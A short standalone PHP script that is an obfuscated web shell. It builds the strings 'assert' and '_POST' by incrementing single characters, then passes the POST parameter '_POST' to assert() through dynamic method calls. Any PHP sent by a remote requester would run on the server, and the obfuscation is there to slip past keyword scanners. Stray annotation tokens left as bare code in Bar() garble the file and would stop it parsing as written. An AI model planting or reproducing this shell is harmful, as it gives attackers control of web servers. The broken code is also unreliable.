<?php
class Foo
{
    function Variable($c)
    {
        $name = 'Bar';
        $b=$this->$name(); // This calls the Bar() method
        $b($c);
    }
    function Bar()
    {
        $__='a'; a
        $a1=$__; a1=a
        $__++;a$__++;c $__++;e $__++;g
        $a2=$__; i
        $__++;i$__++;k$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
        $a3=$__++; 
        $a4=$__++; 
        $a5=$__; 
        $a=$a1.$a4.$a4.$a2.$a3.$a5; 
        return $a;
    }
}
function variable(){
    $_='A';
    $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;
    $b1=$_++; 
    $b2=$_; 
    $_++;$_++;$_++;
    $b3=$_++; 
    $b4=$_; 
    $b='_'.$b2.$b1.$b3.$b4; 
    return $b;
}
$foo = new Foo();
$funcname = "Variable";
$bb=${variable()}[variable()];
$foo->$funcname($bb);
